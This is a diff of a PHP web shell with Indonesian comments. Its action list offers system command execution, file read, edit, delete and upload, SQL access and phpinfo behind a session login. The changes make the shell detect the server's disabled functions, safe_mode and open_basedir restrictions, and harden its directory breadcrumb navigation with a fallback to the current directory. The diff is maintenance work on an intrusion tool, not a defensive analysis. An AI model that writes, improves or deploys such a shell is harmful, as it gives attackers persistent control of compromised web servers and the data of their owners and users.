@@ -104,8 +104,12 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
 //            Indonesia.
 // ===========================================================================
 // Array fungsi yang dinonaktifkan (jika ada)
-$nami = explode(",", "");
-$safeMode = true;
+$nami = [];
+$disabled_functions = ini_get('disable_functions');
+if (!empty($disabled_functions)) {
+    $nami = explode(",", $disabled_functions);
+}
+$safeMode = (bool) ini_get('safe_mode') || stripos(ini_get('open_basedir'), '/') !== false;
 // Daftar aksi yang diperbolehkan
 $actions = array("dasar","baca_file","phpinfo","sistem_kom","edit_file","download_file",'hapus_file','buat_file','buat_folder','reset_file' , 'hapus_folder','rename_file', 'kompres' , 'skl' , 'skl_d_t' , 'skl_d', 'upl_file');
 // Validasi aksi awal dari POST, default ke "dasar"
@@ -159,23 +163,25 @@ function ambilBuat($tAd)
 // Fungsi untuk menampilkan navigasi direktori
 function tulisLah()
 {
-	// =======================================================================
-	// Fungsi tulisLah: Menampilkan breadcrumb direktori.
-	// =======================================================================
-	global $default_dir;
-	$sonDir = array();
-	$umumBagikan = "";
-	$parse = explode("/", $default_dir);
-
-	$ii = 0;
-	foreach($parse AS $bagikan)
-	{
-		$ii++;
-		$umumBagikan .= $bagikan . "/";
-		$sonDir[] = "<a href='javascript:halaman(\"?berkas=" . urlencode(urlencode(kunci($umumBagikan))) . "\")'>" . htmlspecialchars(empty($bagikan) && $ii != count($parse) ? '/' : $bagikan) . "</a>";
-	}
-	$sonDir = implode("/", $sonDir);
-	print $sonDir . '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;( <a href="">Reset</a> | <a href="javascript:goto()">Go to</a> )';
+    global $default_dir;
+    
+    if (!isset($default_dir) || !is_string($default_dir) || $default_dir === '') {
+        $default_dir = getcwd();
+    }
+    
+    $sonDir = array();
+    $umumBagikan = "";
+    $parse = explode("/", (string) $default_dir);
+    
+    $ii = 0;
+    foreach($parse AS $bagikan)
+    {
+        $ii++;
+        $umumBagikan .= $bagikan . "/";
+        $sonDir[] = "<a href='javascript:halaman(\"?berkas=" . urlencode(urlencode(kunci($umumBagikan))) . "\")'>" . htmlspecialchars(empty($bagikan) && $ii != count($parse) ? '/' : $bagikan) . "</a>";
+    }
+    $sonDir = implode("/", $sonDir);
+    print $sonDir . '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;( <a href="">Reset</a> | <a href="javascript:goto()">Go to</a> )';
 }
 
 
